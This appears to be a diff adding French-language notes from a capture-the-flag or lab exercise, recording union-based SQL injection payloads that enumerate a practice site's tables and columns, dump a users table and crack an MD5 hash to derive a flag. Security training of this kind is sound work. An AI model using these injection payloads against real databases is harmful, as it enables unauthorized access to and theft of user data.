@@ -1,0 +1,32 @@
+http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/
+
+SQL injection pour get le tableau 
+1 or 1=1 union select null, table_name from information_schema.tables
+--> db_default, users, guestbook, list_images, vote_dbs
+
+
+1 union (SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users')
+
+
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+
+1 union SELECT table_name, column_name FROM information_schema.columns
+
+db_default : id, username, password
+
+users: user_id, first_name, last_name, town, country, planet, commentaire, countersign
+
+guestbook : id_comment, comment, name
+
+list_images : id, url, title, comment
+
+vote_dbs : id_vote, vote, nb_vote, subject
+
+On cherche dans le tableau des users les donées de utilisateur FlagGeThe et on remarque 2 champs utile:
+-->
+1 or true union SELECT commentaire, countersign from users
+
+commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+countersign: 5ff9d0165b4f92b14994e5c685cdce28
+
+on decrypt 5ff9d0165b4f92b14994e5c685cdce28 en md5 puis on met tous en minuscule et on crypte en sha256!
